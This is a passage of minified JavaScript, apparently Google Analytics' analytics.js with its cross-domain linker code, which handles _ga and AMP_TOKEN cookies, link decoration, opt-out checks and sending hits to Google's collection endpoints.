!function () {
  var t, e, n = this || self, r = function (t, e) {
    t = t.split(".");
    var r, a = n;
    t[0] in a || void 0 === a.execScript || a.execScript("var " + t[0]);
    for (; t.length && (r = t.shift());) t.length || void 0 === e ? a = a[r] && a[r] !== Object.prototype[r] ? a[r] : a[r] = {} : a[r] = e
  }, a = function (t, e) {
    for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n])
  }, i = function (t) {
    for (var e in t) if (t.hasOwnProperty(e)) return !0;
    return !1
  };

  function o() {
    for (var e = t, n = {}, r = 0; r < e.length; ++r) n[e[r]] = r;
    return n
  }

  function s() {
    var t = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    return (t += t.toLowerCase() + "0123456789-_") + "."
  }

  function c(n) {
    function r(t) {
      for (; i < n.length;) {
        var r = n.charAt(i++), a = e[r];
        if (null != a) return a;
        if (!/^[\s\xa0]*$/.test(r)) throw Error("Unknown base64 encoding at char: " + r)
      }
      return t
    }

    t = t || s(), e = e || o();
    for (var a = "", i = 0; ;) {
      var c = r(-1), u = r(0), l = r(64), g = r(64);
      if (64 === g && -1 === c) return a;
      a += String.fromCharCode(c << 2 | u >> 4), 64 != l && (a += String.fromCharCode(u << 4 & 240 | l >> 2), 64 != g && (a += String.fromCharCode(l << 6 & 192 | g)))
    }
  }

  var u, l = {}, g = function (t) {
      l.TAGGING = l.TAGGING || [], l.TAGGING[t] = !0
    }, f = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i, h = window, d = window.history, p = document,
    v = navigator, m = function (t, e) {
      p.addEventListener ? p.addEventListener(t, e, !1) : p.attachEvent && p.attachEvent("on" + t, e)
    }, w = /:[0-9]+$/, _ = function (t, e) {
      return e && (e = String(e).toLowerCase()), "protocol" !== e && "port" !== e || (t.protocol = y(t.protocol) || y(h.location.protocol)), "port" === e ? t.port = String(Number(t.hostname ? t.port : h.location.port) || ("http" === t.protocol ? 80 : "https" === t.protocol ? 443 : "")) : "host" === e && (t.hostname = (t.hostname || h.location.hostname).replace(w, "").toLowerCase()), b(t, e)
    }, b = function (t, e, n) {
      var r = y(t.protocol);
      switch (e && (e = String(e).toLowerCase()), e) {
        case"url_no_fragment":
          n = "", t && t.href && (n = 0 > (n = t.href.indexOf("#")) ? t.href : t.href.substr(0, n)), t = n;
          break;
        case"protocol":
          t = r;
          break;
        case"host":
          t = t.hostname.replace(w, "").toLowerCase(), n && (n = /^www\d*\./.exec(t)) && n[0] && (t = t.substr(n[0].length));
          break;
        case"port":
          t = String(Number(t.port) || ("http" === r ? 80 : "https" === r ? 443 : ""));
          break;
        case"path":
          t.pathname || t.hostname || g(1), t = (t = "/" === t.pathname.substr(0, 1) ? t.pathname : "/" + t.pathname).split("/"), 0 <= [].indexOf(t[t.length - 1]) && (t[t.length - 1] = ""), t = t.join("/");
          break;
        case"query":
          t = t.search.replace("?", "");
          break;
        case"extension":
          t = (t = 1 < (t = t.pathname.split(".")).length ? t[t.length - 1] : "").split("/")[0];
          break;
        case"fragment":
          t = t.hash.replace("#", "");
          break;
        default:
          t = t && t.href
      }
      return t
    }, y = function (t) {
      return t ? t.replace(":", "").toLowerCase() : ""
    }, k = function (t) {
      var e = p.createElement("a");
      t && (e.href = t);
      var n = e.pathname;
      return "/" !== n[0] && (t || g(1), n = "/" + n), t = e.hostname.replace(w, ""), {
        href: e.href,
        protocol: e.protocol,
        host: e.host,
        hostname: t,
        pathname: n,
        search: e.search,
        hash: e.hash,
        port: e.port
      }
    }, x = function () {
      var t = G, e = q, n = S(), r = function (e) {
        t(e.target || e.srcElement || {})
      };
      if (!n.init) {
        m("mousedown", r), m("keyup", r), m("submit", (function (t) {
          e(t.target || t.srcElement || {})
        }));
        var a = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function () {
          e(this), a.call(this)
        }, n.init = !0
      }
    }, T = function (t, e, n, r, a) {
      t = {callback: t, domains: e, fragment: 2 === n, placement: n, forms: r, sameHost: a}, S().decorators.push(t)
    }, O = function (t, e, n) {
      for (var r = S().decorators, i = {}, o = 0; o < r.length; ++o) {
        var s, c = r[o];
        if (s = !n || c.forms) t:{
          s = c.domains;
          var u = t, l = !!c.sameHost;
          if (s && (l || u !== p.location.hostname)) for (var g = 0; g < s.length; g++) if (s[g] instanceof RegExp) {
            if (s[g].test(u)) {
              s = !0;
              break t
            }
          } else if (0 <= u.indexOf(s[g]) || l && 0 <= s[g].indexOf(u)) {
            s = !0;
            break t
          }
          s = !1
        }
        s && (null == (s = c.placement) && (s = c.fragment ? 2 : 1), s === e && a(i, c.callback()))
      }
      return i
    };

  function S() {
    var t = {}, e = h.google_tag_data;
    return h.google_tag_data = void 0 === e ? t : e, (e = (t = h.google_tag_data).gl) && e.decorators || (e = {decorators: []}, t.gl = e), e
  }

  var C = /(.*?)\*(.*?)\*(.*)/, A = /([^?#]+)(\?[^#]*)?(#.*)?/;

  function E(t) {
    return new RegExp("(.*?)(^|&)" + t + "=([^&]*)&?(.*)")
  }

  var N = function (n) {
    var r, a = [];
    for (r in n) if (n.hasOwnProperty(r)) {
      var i = n[r];
      if (void 0 !== i && i == i && null !== i && "[object Object]" !== i.toString()) {
        a.push(r);
        var c = a, u = c.push;
        i = String(i), t = t || s(), e = e || o();
        for (var l = [], g = 0; g < i.length; g += 3) {
          var f = g + 1 < i.length, h = g + 2 < i.length, d = i.charCodeAt(g), p = f ? i.charCodeAt(g + 1) : 0,
            v = h ? i.charCodeAt(g + 2) : 0, m = d >> 2;
          d = (3 & d) << 4 | p >> 4, p = (15 & p) << 2 | v >> 6, v &= 63, h || (v = 64, f || (p = 64)), l.push(t[m], t[d], t[p], t[v])
        }
        u.call(c, l.join(""))
      }
    }
    return ["1", j(n = a.join("*")), n].join("*")
  };

  function j(t, e) {
    if (t = [v.userAgent, (new Date).getTimezoneOffset(), v.userLanguage || v.language, Math.floor(new Date(Date.now()).getTime() / 60 / 1e3) - (void 0 === e ? 0 : e), t].join("*"), !(e = u)) {
      e = Array(256);
      for (var n = 0; 256 > n; n++) {
        for (var r = n, a = 0; 8 > a; a++) r = 1 & r ? r >>> 1 ^ 3988292384 : r >>> 1;
        e[n] = r
      }
    }
    for (u = e, e = 4294967295, n = 0; n < t.length; n++) e = e >>> 8 ^ u[255 & (e ^ t.charCodeAt(n))];
    return ((-1 ^ e) >>> 0).toString(36)
  }

  function R(t) {
    return function (e) {
      var n = k(h.location.href), r = n.search.replace("?", "");
      t:{
        for (var a = r.split("&"), i = 0; i < a.length; i++) {
          var o = a[i].split("=");
          if ("_gl" === decodeURIComponent(o[0]).replace(/\+/g, " ")) {
            a = o.slice(1).join("=");
            break t
          }
        }
        a = void 0
      }
      e.query = L(a || "") || {}, i = (a = _(n, "fragment")).match(E("_gl")), e.fragment = L(i && i[3] || "") || {}, t && function (t, e, n) {
        function r(t, e) {
          return (t = I("_gl", t)).length && (t = e + t), t
        }

        if (d && d.replaceState) {
          var a = E("_gl");
          (a.test(e) || a.test(n)) && (t = _(t, "path"), e = r(e, "?"), n = r(n, "#"), d.replaceState({}, void 0, "" + t + e + n))
        }
      }(n, r, a)
    }
  }

  function I(t, e) {
    if (t = E(t).exec(e)) {
      var n = t[2], r = t[4];
      e = t[1], r && (e = e + n + r)
    }
    return e
  }

  var L = function (t) {
    try {
      t:{
        if (t) {
          e:{
            for (var e = 0; 3 > e; ++e) {
              var n = C.exec(t);
              if (n) {
                var r = n;
                break e
              }
              t = decodeURIComponent(t)
            }
            r = void 0
          }
          if (r && "1" === r[1]) {
            var a = r[2], i = r[3];
            e:{
              for (r = 0; 3 > r; ++r) if (a === j(i, r)) {
                var o = !0;
                break e
              }
              o = !1
            }
            if (o) {
              var s = i;
              break t
            }
            g(7)
          }
        }
        s = void 0
      }
      if (void 0 !== (a = s)) {
        s = {};
        var u = a ? a.split("*") : [];
        for (a = 0; a + 1 < u.length; a += 2) {
          var l = u[a], f = c(u[a + 1]);
          s[l] = f
        }
        return g(6), s
      }
    } catch (t) {
      g(8)
    }
  };

  function P(t, e, n, r) {
    function a(e) {
      var n = (e = I(t, e)).charAt(e.length - 1);
      return e && "&" !== n && (e += "&"), e + s
    }

    r = void 0 !== r && r;
    var i = A.exec(n);
    if (!i) return "";
    n = i[1];
    var o = i[2] || "";
    i = i[3] || "";
    var s = t + "=" + e;
    return r ? i = "#" + a(i.substring(1)) : o = "?" + a(o.substring(1)), "" + n + o + i
  }

  function M(t, e) {
    var n = "FORM" === (t.tagName || "").toUpperCase(), r = O(e, 1, n), a = O(e, 2, n);
    for (var o in e = O(e, 3, n), i(r) && (r = N(r), n ? D("_gl", r, t) : U("_gl", r, t, !1)), !n && i(a) && U("_gl", n = N(a), t, !0), e) e.hasOwnProperty(o) && $(o, e[o], t)
  }

  function $(t, e, n, r) {
    if (n.tagName) {
      if ("a" === n.tagName.toLowerCase()) return U(t, e, n, r);
      if ("form" === n.tagName.toLowerCase()) return D(t, e, n)
    }
    if ("string" == typeof n) return P(t, e, n, r)
  }

  function U(t, e, n, r) {
    n.href && (t = P(t, e, n.href, void 0 !== r && r), f.test(t) && (n.href = t))
  }

  function D(t, e, n) {
    if (n && n.action) {
      var r = (n.method || "").toLowerCase();
      if ("get" === r) {
        r = n.childNodes || [];
        for (var a = !1, i = 0; i < r.length; i++) {
          var o = r[i];
          if (o.name === t) {
            o.setAttribute("value", e), a = !0;
            break
          }
        }
        a || ((r = p.createElement("input")).setAttribute("type", "hidden"), r.setAttribute("name", t), r.setAttribute("value", e), n.appendChild(r))
      } else "post" === r && (t = P(t, e, n.action), f.test(t) && (n.action = t))
    }
  }

  function G(t) {
    try {
      t:{
        for (var e = 100; t && 0 < e;) {
          if (t.href && t.nodeName.match(/^a(?:rea)?$/i)) {
            var n = t;
            break t
          }
          t = t.parentNode, e--
        }
        n = null
      }
      if (n) {
        var r = n.protocol;
        "http:" !== r && "https:" !== r || M(n, n.hostname)
      }
    } catch (t) {
    }
  }

  function q(t) {
    try {
      if (t.action) M(t, _(k(t.action), "host"))
    } catch (t) {
    }
  }

  r("google_tag_data.glBridge.auto", (function (t, e, n, r) {
    x(), T(t, e, "fragment" === n ? 2 : 1, !!r, !1)
  })), r("google_tag_data.glBridge.passthrough", (function (t, e, n) {
    x(), T(t, [b(h.location, "host", !0)], e, !!n, !0)
  })), r("google_tag_data.glBridge.decorate", (function (t, e, n) {
    return $("_gl", t = N(t), e, !!n)
  })), r("google_tag_data.glBridge.generate", N), r("google_tag_data.glBridge.get", (function (t, e) {
    var n = R(!!e);
    return (e = S()).data || (e.data = {
      query: {},
      fragment: {}
    }, n(e.data)), n = {}, (e = e.data) && (a(n, e.query), t && a(n, e.fragment)), n
  }))
}(window), function () {
  function t(t) {
    var e, n = 1;
    if (t) for (n = 0, e = t.length - 1; 0 <= e; e--) {
      var r = t.charCodeAt(e);
      n = 0 != (r = 266338304 & (n = (n << 6 & 268435455) + r + (r << 14))) ? n ^ r >> 21 : n
    }
    return n
  }

  var e = function (t) {
    this.C = t || []
  };
  e.prototype.set = function (t) {
    this.C[t] = !0
  }, e.prototype.encode = function () {
    for (var t = [], e = 0; e < this.C.length; e++) this.C[e] && (t[Math.floor(e / 6)] ^= 1 << e % 6);
    for (e = 0; e < t.length; e++) t[e] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".charAt(t[e] || 0);
    return t.join("") + "~"
  };
  var n, r, a = window.GoogleAnalyticsObject;
  if ((n = null != a) && (n = -1 < (a.constructor + "").indexOf("String")), r = n) {
    var i = window.GoogleAnalyticsObject;
    r = i ? i.replace(/^[\s\xa0]+|[\s\xa0]+$/g, "") : ""
  }
  var o = r || "ga", s = /^(?:utma\.)?\d+\.\d+$/, c = /^amp-[\w.-]{22,64}$/, u = !1, l = new e;

  function g(t) {
    l.set(t)
  }

  var f = function (t) {
    t = h(t), t = new e(t);
    for (var n = l.C.slice(), r = 0; r < t.C.length; r++) n[r] = n[r] || t.C[r];
    return new e(n).encode()
  }, h = function (t) {
    return t = t.get(Ye), p(t) || (t = []), t
  }, d = function (t) {
    return "function" == typeof t
  }, p = function (t) {
    return "[object Array]" == Object.prototype.toString.call(Object(t))
  }, v = function (t) {
    return null != t && -1 < (t.constructor + "").indexOf("String")
  }, m = function (t, e) {
    return 0 == t.indexOf(e)
  }, w = function () {
    for (var e = I.navigator.userAgent + (L.cookie ? L.cookie : "") + (L.referrer ? L.referrer : ""), n = e.length, r = I.history.length; 0 < r;) e += r-- ^ n++;
    return [It() ^ 2147483647 & t(e), Math.round((new Date).getTime() / 1e3)].join(".")
  }, _ = function () {
  }, b = function (t) {
    return encodeURIComponent instanceof Function ? encodeURIComponent(t) : (g(28), t)
  }, y = function (t, e, n, r) {
    try {
      t.addEventListener ? t.addEventListener(e, n, !!r) : t.attachEvent && t.attachEvent("on" + e, n)
    } catch (t) {
      g(27)
    }
  }, k = /^[\w\-:/.?=&%!\[\]]+$/, x = /^[\w+/_-]+[=]{0,2}$/, T = null, O = function (t, e, n, r, a) {
    if (!T) {
      T = {
        createScriptURL: function (t) {
          return t
        }, createHTML: function (t) {
          return t
        }
      };
      try {
        T = window.trustedTypes.createPolicy("google-analytics", T)
      } catch (t) {
      }
    }
    if (t) {
      var i = L.querySelector && L.querySelector("script[nonce]") || null;
      i = i && (i.nonce || i.getAttribute && i.getAttribute("nonce")) || "", n ? (a = r = "", e && k.test(e) && (r = ' id="' + e + '"'), i && x.test(i) && (a = ' nonce="' + i + '"'), k.test(t) && L.write(T.createHTML("<script" + r + a + ' src="' + t + '"><\/script>'))) : ((n = L.createElement("script")).type = "text/javascript", n.async = !0, n.src = T.createScriptURL(t), r && (n.onload = r), a && (n.onerror = a), e && (n.id = e), i && n.setAttribute("nonce", i), (t = L.getElementsByTagName("script")[0]).parentNode.insertBefore(n, t))
    }
  }, S = function (t, e) {
    return C(L.location[e ? "href" : "search"], t)
  }, C = function (t, e) {
    return (t = t.match("(?:&|#|\\?)" + b(e).replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1") + "=([^&#]*)")) && 2 == t.length ? t[1] : ""
  }, A = function () {
    var t = "" + L.location.hostname;
    return 0 == t.indexOf("www.") ? t.substring(4) : t
  }, E = function (t, e) {
    var n = t.indexOf(e);
    return (5 == n || 6 == n) && ("/" == (t = t.charAt(n + e.length)) || "?" == t || "" == t || ":" == t)
  }, N = function (t, e) {
    if (1 == e.length && null != e[0] && "object" == typeof e[0]) return e[0];
    for (var n = {}, r = Math.min(t.length + 1, e.length), a = 0; a < r; a++) {
      if ("object" == typeof e[a]) {
        for (var i in e[a]) e[a].hasOwnProperty(i) && (n[i] = e[a][i]);
        break
      }
      a < t.length && (n[t[a]] = e[a])
    }
    return n
  }, j = function (t, e) {
    for (var n = 0; n < t.length; n++) if (e == t[n]) return !0;
    return !1
  }, R = function () {
    this.oa = [], this.ea = {}, this.m = {}
  };
  R.prototype.set = function (t, e, n) {
    this.oa.push(t), n ? this.m[":" + t] = e : this.ea[":" + t] = e
  }, R.prototype.get = function (t) {
    return this.m.hasOwnProperty(":" + t) ? this.m[":" + t] : this.ea[":" + t]
  }, R.prototype.map = function (t) {
    for (var e = 0; e < this.oa.length; e++) {
      var n = this.oa[e], r = this.get(n);
      r && t(n, r)
    }
  };
  var I = window, L = document, P = document.currentScript ? document.currentScript.src : "", M = function (t, e) {
    return setTimeout(t, e)
  }, $ = window, U = document, D = function (t) {
    var e = $._gaUserPrefs;
    if (e && e.ioo && e.ioo() || t && !0 === $["ga-disable-" + t]) return !0;
    try {
      var n = $.external;
      if (n && n._gaUserPrefs && "oo" == n._gaUserPrefs) return !0
    } catch (t) {
    }
    for (t = [], e = String(U.cookie).split(";"), n = 0; n < e.length; n++) {
      var r = e[n].split("="), a = r[0].replace(/^\s*|\s*$/g, "");
      a && "AMP_TOKEN" == a && ((r = r.slice(1).join("=").replace(/^\s*|\s*$/g, "")) && (r = decodeURIComponent(r)), t.push(r))
    }
    for (e = 0; e < t.length; e++) if ("$OPT_OUT" == t[e]) return !0;
    return !!U.getElementById("__gaOptOutExtension")
  }, G = function (t) {
    var e = [], n = L.cookie.split(";");
    t = new RegExp("^\\s*" + t + "=\\s*(.*?)\\s*$");
    for (var r = 0; r < n.length; r++) {
      var a = n[r].match(t);
      a && e.push(a[1])
    }
    return e
  }, q = function (t, e, n, r, a, i, o) {
    if (!(a = !D(a) && !(V.test(L.location.hostname) || "/" == n && H.test(r)))) return !1;
    if (e && 1200 < e.length && (e = e.substring(0, 1200)), n = t + "=" + e + "; path=" + n + "; ", i && (n += "expires=" + new Date((new Date).getTime() + i).toGMTString() + "; "), r && "none" !== r && (n += "domain=" + r + ";"), o && (n += o + ";"), r = L.cookie, L.cookie = n, !(r = r != L.cookie)) t:{
      for (t = G(t), r = 0; r < t.length; r++) if (e == t[r]) {
        r = !0;
        break t
      }
      r = !1
    }
    return r
  }, F = function (t) {
    return encodeURIComponent ? encodeURIComponent(t).replace(/\(/g, "%28").replace(/\)/g, "%29") : t
  }, H = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/, V = /(^|\.)doubleclick\.net$/i, B = function (t) {
    var e = [], n = L.cookie.split(";");
    t = new RegExp("^\\s*" + (t || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$");
    for (var r = 0; r < n.length; r++) {
      var a = n[r].match(t);
      a && e.push({ja: a[1], value: a[2], timestamp: Number(a[2].split(".")[1]) || 0})
    }
    return e.sort((function (t, e) {
      return e.timestamp - t.timestamp
    })), e
  };

  function z(t, e, n) {
    var r = {};
    if (!(e = B(e)) || !e.length) return r;
    for (var a = 0; a < e.length; a++) {
      var i = e[a].value.split(".");
      if ("1" !== i[0] || n && 3 > i.length || !n && 3 !== i.length) t && (t.na = !0); else if (Number(i[1])) {
        r[e[a].ja] ? t && (t.pa = !0) : r[e[a].ja] = [];
        var o = {version: i[0], timestamp: 1e3 * Number(i[1]), qa: i[2]};
        n && 3 < i.length && (o.labels = i.slice(3)), r[e[a].ja].push(o)
      }
    }
    return r
  }

  var K, X, W, Z, Y = /^https?:\/\/[^/]*cdn\.ampproject\.org\//, J = /^(?:www\.|m\.|amp\.)+/, Q = [],
    tt = function (t) {
      if (st(t[Gn])) {
        var e;
        if (void 0 === Z) (e = (e = Pr.get()) && e._ga || void 0) && (Z = e, g(81));
        if (void 0 !== Z) return t[_n] || (t[_n] = Z), !1
      }
      if (t[Gn]) {
        if (g(67), t[Rn] && "cookie" != t[Rn]) return !1;
        if (void 0 !== Z) t[_n] || (t[_n] = Z); else {
          t:{
            e = String(t[On] || A());
            var n = String(t[Sn] || "/"), r = G(String(t[Tn] || "_ga"));
            if (!(e = Tr(r, e, n)) || s.test(e)) e = !0; else if (0 == (e = G("AMP_TOKEN")).length) e = !0; else {
              if (1 == e.length && ("$RETRIEVING" == (e = decodeURIComponent(e[0])) || "$OPT_OUT" == e || "$ERROR" == e || "$NOT_FOUND" == e)) {
                e = !0;
                break t
              }
              e = !1
            }
          }
          if (e && nt(et, String(t[xn]))) return !0
        }
      }
      return !1
    }, et = function () {
      Ia.D([_])
    }, nt = function (t, e) {
      var n = G("AMP_TOKEN");
      return 1 < n.length ? (g(55), !1) : "$OPT_OUT" == (n = decodeURIComponent(n[0] || "")) || "$ERROR" == n || D(e) ? (g(62), !1) : Y.test(L.referrer) || "$NOT_FOUND" != n ? void 0 !== Z ? (g(56), M((function () {
        t(Z)
      }), 0), !0) : K ? (Q.push(t), !0) : "$RETRIEVING" == n ? (g(57), M((function () {
        nt(t, e)
      }), 1e4), !0) : (K = !0, n && "$" != n[0] || (it("$RETRIEVING", 3e4), setTimeout(at, 3e4), n = ""), !!rt(n, e) && (Q.push(t), !0)) : (g(68), !1)
    }, rt = function (t, e, n) {
      if (!window.JSON) return g(58), !1;
      var r = I.XMLHttpRequest;
      if (!r) return g(59), !1;
      var a = new r;
      return "withCredentials" in a ? (a.open("POST", (n || "https://ampcid.google.com/v1/publisher:getClientId") + "?key=AIzaSyA65lEHUEizIsNtlbNo-l2K18dT680nsaM", !0), a.withCredentials = !0, a.setRequestHeader("Content-Type", "text/plain"), a.onload = function () {
        if (K = !1, 4 == a.readyState) {
          try {
            200 != a.status && (g(61), ot("", "$ERROR", 3e4));
            var r = JSON.parse(a.responseText);
            r.optOut ? (g(63), ot("", "$OPT_OUT", 31536e6)) : r.clientId ? ot(r.clientId, r.securityToken, 31536e6) : !n && r.alternateUrl ? (X && clearTimeout(X), K = !0, rt(t, e, r.alternateUrl)) : (g(64), ot("", "$NOT_FOUND", 36e5))
          } catch (t) {
            g(65), ot("", "$ERROR", 3e4)
          }
          a = null
        }
      }, r = {originScope: "AMP_ECID_GOOGLE"}, t && (r.securityToken = t), a.send(JSON.stringify(r)), X = M((function () {
        g(66), ot("", "$ERROR", 3e4)
      }), 1e4), !0) : (g(60), !1)
    }, at = function () {
      K = !1
    }, it = function (t, e) {
      if (void 0 === W) {
        W = "";
        for (var n = Cr(), r = 0; r < n.length; r++) {
          var a = n[r];
          if (q("AMP_TOKEN", encodeURIComponent(t), "/", a, "", e)) return void (W = a)
        }
      }
      q("AMP_TOKEN", encodeURIComponent(t), "/", W, "", e)
    }, ot = function (t, e, n) {
      for (X && clearTimeout(X), e && it(e, n), Z = t, e = Q, Q = [], n = 0; n < e.length; n++) e[n](t)
    }, st = function (t) {
      t:{
        if (Y.test(L.referrer)) {
          var e = L.location.hostname.replace(J, "");
          e:{
            var n = L.referrer, r = (n = n.replace(/^https?:\/\//, "")).replace(/^[^/]+/, "").split("/"), a = r[2];
            if (!(r = (r = "s" == a ? r[3] : a) ? decodeURIComponent(r) : r)) {
              if (0 == n.indexOf("xn--")) {
                n = "";
                break e
              }
              (n = n.match(/(.*)\.cdn\.ampproject\.org\/?$/)) && 2 == n.length && (r = n[1].replace(/-/g, ".").replace(/\.\./g, "-"))
            }
            n = r ? r.replace(J, "") : ""
          }
          if ((r = e === n) || (n = "." + n, r = e.substring(e.length - n.length, e.length) === n), r) {
            e = !0;
            break t
          }
          g(78)
        }
        e = !1
      }
      return e && !1 !== t
    }, ct = function (t) {
      return (t || u || "https:" == L.location.protocol ? "https:" : "http:") + "//www.google-analytics.com"
    }, ut = function (t) {
      switch (t) {
        default:
        case 1:
          return "https://www.google-analytics.com/gtm/js?id=";
        case 2:
          return "https://www.googletagmanager.com/gtag/js?id="
      }
    }, lt = function (t) {
      this.name = "len", this.message = t + "-8192"
    }, gt = function (t, e, n) {
      if (n = n || _, 2036 >= e.length) ht(t, e, n); else {
        if (!(8192 >= e.length)) throw wt("len", e.length), new lt(e.length);
        mt(t, e, n) || dt(t, e, n) || ht(t, e, n)
      }
    }, ft = function (t, e, n, r) {
      dt(t + "?" + e, "", r = r || _, n)
    }, ht = function (t, e, n) {
      var r = function (t) {
        var e = L.createElement("img");
        return e.width = 1, e.height = 1, e.src = t, e
      }(t + "?" + e);
      r.onload = r.onerror = function () {
        r.onload = null, r.onerror = null, n()
      }
    }, dt = function (t, e, n, r) {
      var a = I.XMLHttpRequest;
      if (!a) return !1;
      var i = new a;
      return "withCredentials" in i && (t = t.replace(/^http:/, "https:"), i.open("POST", t, !0), i.withCredentials = !0, i.setRequestHeader("Content-Type", "text/plain"), i.onreadystatechange = function () {
        if (4 == i.readyState) {
          if (r && "text/plain" === i.getResponseHeader("Content-Type")) try {
            pt(r, i.responseText, n)
          } catch (t) {
            wt("xhr", "rsp"), n()
          } else n();
          i = null
        }
      }, i.send(e), !0)
    }, pt = function (t, e, n) {
      if (1 > e.length) wt("xhr", "ver", "0"), n(); else if (3 < t.count++) wt("xhr", "tmr", "" + t.count), n(); else {
        var r = e.charAt(0);
        if ("1" === r) vt(t, e.substring(1), n); else if (t.V && "2" === r) {
          var a = e.substring(1).split(","), i = 0;
          for (e = function () {
            ++i === a.length && n()
          }, r = 0; r < a.length; r++) vt(t, a[r], e)
        } else wt("xhr", "ver", String(e.length)), n()
      }
    }, vt = function (t, e, n) {
      if (0 === e.length) n(); else {
        var r = e.charAt(0);
        switch (r) {
          case"d":
            ft("https://stats.g.doubleclick.net/j/collect", t.U, t, n);
            break;
          case"g":
            ht("https://www.google.com/ads/ga-audiences", t.google, n), (e = e.substring(1)) && (/^[a-z.]{1,6}$/.test(e) ? ht("https://www.google.%/ads/ga-audiences".replace("%", e), t.google, _) : wt("tld", "bcc", e));
            break;
          case"G":
            if (t.V) {
              t.V("G-" + e.substring(1)), n();
              break
            }
          case"x":
            if (t.V) {
              t.V(), n();
              break
            }
          case"c":
            if (t.V) {
              t.V(e.substring(1)), n();
              break
            }
          default:
            wt("xhr", "brc", r), n()
        }
      }
    }, mt = function (t, e, n) {
      return !!I.navigator.sendBeacon && (!!I.navigator.sendBeacon(t, e) && (n(), !0))
    }, wt = function (t, e, n) {
      1 <= 100 * Math.random() || D("?") || (t = ["t=error", "_e=" + t, "_v=j99", "sr=1"], e && t.push("_f=" + e), n && t.push("_m=" + b(n.substring(0, 100))), t.push("aip=1"), t.push("z=" + It()), ht(ct(!0) + "/u/d", t.join("&"), _))
    }, _t = function () {
      return I.gaData = I.gaData || {}
    }, bt = function (t) {
      var e = _t();
      return e[t] = e[t] || {}
    }, yt = function () {
      this.M = []
    };

  function kt(e) {
    if (100 != e.get(Pn) && t($t(e, _n)) % 1e4 >= 100 * Ut(e, Pn)) throw"abort"
  }

  function xt(t) {
    if (D($t(t, xn))) throw"abort"
  }

  function Tt() {
    var t = L.location.protocol;
    if ("http:" != t && "https:" != t) throw"abort"
  }

  function Ot(t) {
    try {
      I.navigator.sendBeacon ? g(42) : I.XMLHttpRequest && "withCredentials" in new I.XMLHttpRequest && g(40)
    } catch (t) {
    }
    t.set(Ze, f(t), !0), t.set(ie, Ut(t, ie) + 1);
    var e = [];
    Ht.map((function (n, r) {
      r.F && (null != (n = t.get(n)) && n != r.defaultValue && ("boolean" == typeof n && (n *= 1), e.push(r.F + "=" + b("" + n))))
    })), !1 === t.get(sr) && e.push("npa=1"), e.push("z=" + Lt()), t.set(ne, e.join("&"), !0)
  }

  function St(t) {
    var e = $t(t, ae);
    !e && t.get(re) && (e = "beacon");
    var n = $t(t, er), r = $t(t, zn), a = n || (r || ct(!1) + "") + "/collect";
    if ("d" === $t(t, ir)) a = n || (r || ct(!1) + "") + "/j/collect", e = t.get(ar) || void 0, ft(a, $t(t, ne), e, t.Z(ee)); else e ? (n = $t(t, ne), r = (r = t.Z(ee)) || _, "image" == e ? ht(a, n, r) : "xhr" == e && dt(a, n, r) || "beacon" == e && mt(a, n, r) || gt(a, n, r)) : gt(a, $t(t, ne), t.Z(ee));
    a = $t(t, xn), e = (a = bt(a)).hitcount, a.hitcount = e ? e + 1 : 1, a.first_hit || (a.first_hit = (new Date).getTime()), a = $t(t, xn), delete bt(a).pending_experiments, t.set(ee, _, !0)
  }

  function Ct(t) {
    _t().expId && t.set(Ge, _t().expId), _t().expVar && t.set(qe, _t().expVar);
    var e = $t(t, xn);
    if (e = bt(e).pending_experiments) {
      var n = [];
      for (r in e) e.hasOwnProperty(r) && e[r] && n.push(encodeURIComponent(r) + "." + encodeURIComponent(e[r]));
      var r = n.join("!")
    } else r = void 0;
    r && ((e = t.get(Fe)) && (r = e + "!" + r), t.set(Fe, r, !0))
  }

  function At() {
    if (I.navigator && "preview" == I.navigator.loadPurpose) throw"abort"
  }

  function Et(t) {
    var e = I.gaDevIds || [];
    if (p(e)) {
      var n = t.get("&did");
      v(n) && 0 < n.length && (e = e.concat(n.split(","))), n = [];
      for (var r = 0; r < e.length; r++) j(n, e[r]) || n.push(e[r]);
      0 != n.length && t.set("&did", n.join(","), !0)
    }
  }

  function Nt(t) {
    if (!t.get(xn)) throw"abort"
  }

  function jt(t) {
    try {
      if (!t.get(Yn) && (t.set(Yn, !0), !t.get("&gtm"))) {
        var e = void 0;
        if (Rt(S("gtm_debug")) && (e = 2), !e && m(L.referrer, "https://tagassistant.google.com/") && (e = 3), !e && j(L.cookie.split("; "), "__TAG_ASSISTANT=x") && (e = 4), e || Rt(L.documentElement.getAttribute("data-tag-assistant-present")) && (e = 5), e) {
          I["google.tagmanager.debugui2.queue"] || (I["google.tagmanager.debugui2.queue"] = [], O("https://www.google-analytics.com/debug/bootstrap?id=" + t.get(xn) + "&src=LEGACY&cond=" + e));
          var n = L.currentScript;
          I["google.tagmanager.debugui2.queue"].push({
            messageType: "LEGACY_CONTAINER_STARTING",
            data: {id: t.get(xn), scriptSource: n && n.src || ""}
          })
        }
      }
    } catch (t) {
    }
  }

  function Rt(t) {
    if (null == t || 0 === t.length) return !1;
    t = Number(t);
    var e = Date.now();
    return t < e + 3e5 && t > e - 9e5
  }

  yt.prototype.add = function (t) {
    this.M.push(t)
  }, yt.prototype.D = function (t) {
    try {
      for (var e = 0; e < this.M.length; e++) {
        var n = t.get(this.M[e]);
        n && d(n) && n.call(I, t)
      }
    } catch (t) {
    }
    (e = t.get(ee)) != _ && d(e) && (t.set(ee, _, !0), setTimeout(e, 10))
  };
  var It = function () {
    return Math.round(2147483647 * Math.random())
  }, Lt = function () {
    try {
      var t = new Uint32Array(1);
      return I.crypto.getRandomValues(t), 2147483647 & t[0]
    } catch (t) {
      return It()
    }
  };

  function Pt(t) {
    var e = Ut(t, ze);
    500 <= e && g(15);
    var n = $t(t, te);
    if ("transaction" != n && "item" != n) {
      n = Ut(t, Xe);
      var r = (new Date).getTime(), a = Ut(t, Ke);
      if (0 == a && t.set(Ke, r), 0 < (a = Math.round(2 * (r - a) / 1e3)) && (n = Math.min(n + a, 20), t.set(Ke, r)), 0 >= n) throw"abort";
      t.set(Xe, --n)
    }
    t.set(ze, ++e)
  }

  var Mt = function () {
    this.data = new R
  };
